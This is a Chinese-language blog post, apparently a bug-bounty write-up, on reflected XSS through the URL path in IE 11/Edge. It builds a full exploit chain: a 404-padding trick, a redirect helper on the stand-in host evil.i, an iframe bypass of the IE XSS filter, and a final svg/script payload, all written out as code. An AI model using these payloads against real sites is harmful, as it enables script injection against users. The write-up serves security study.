---
layout: post
title: bug bounty writeup - xss in url path
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - L3m0n</p>

漏洞点: http://lemon.i/test/xss/13.php/i_am_xss_point/i_am_xss_point/

Demo Code:

{% highlight php %}
<?php
header('HTTP/1.1 404 Not Found');
$path = trim($_SERVER['PATH_INFO'],"/");
$limit_pos = strrpos(trim($path,"/"),'/');
$action_name = substr($path, $limit_pos);
$controller_name = str_replace("/","\\",substr($path, 0, $limit_pos));
echo "Action: " . $action_name . " has controller: \\" . $controller_name;
?>
{% endhighlight %}

## 404头的问题

如果404响应返回内容小于512字节，则使用IE自带的404页面

<img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgmq53r6j216y0leq7a.jpg">

所以添加多个字符即可显示出来内容

<img src="https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgmuvz2hj21ny0f2wpl.jpg">

2、url path问题 -> urlencode编码

浏览器下访问直接访问都会进行url编码

<img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgqon7f6j217u08cwku.jpg">

但是在IE下，使用3xx跳转后可以绕过

{% highlight php %}
<?php
header("Location: "http://".$_GET["host"]."/".urldecode($_GET["payload"]),true,302);
{% endhighlight %}

{% highlight php %}
http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=<>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<>
{% endhighlight %}

<img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgmz9un3j214o08k441.jpg">

但是可以看到ie filter限制了

<img src="https://wx2.sinaimg.cn/mw690/9c5c5d93ly1fxqgn2pu2uj21o008oqat.jpg">

## bypass IE filter

IE edge / 11下这样利用

{% highlight javascript %}
<iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>'" src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>
{% endhighlight %}

所以换到目标，则payload为如下:

{% highlight javascript %}
<iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<iframe>" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<img src=1 onerror=alert(1)>'"></iframe>
{% endhighlight %}

<img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqgn6ql2dj21ek0k0dpu.jpg">

但是又被一些坑点限制了:

{% highlight javascript %}
无空格(会被url->%20)
无/(会被转换为\)
{% endhighlight %}

## bypass限制
通过下面的payload可绕过

{% highlight javascript %}
<svg><script>alert(document.domain)<b>
{% endhighlight %}

最终payload:

{% highlight javascript %}
<iframe src="http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<iframe>" onload="contentWindow[0].location='http://evil.i/test/xss/12.php?host=lemon.i/test/xss/13.php&payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<svg><script>alert(document.domain)<b>'"></iframe>
{% endhighlight %}

<img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqgnikd09j227y0to46b.jpg">

## Referer

<a target="_blank" href="https://hackerone.com/reports/311467">Reflected XSS in the IE 11 / Edge</a><br>
<a target="_blank" href="https://github.com/masatokinugawa/filterbypass/wiki/Browser%27s-XSS-Filter-Bypass-Cheat-Sheet">Browser's XSS Filter Bypass Cheat Sheet</a>
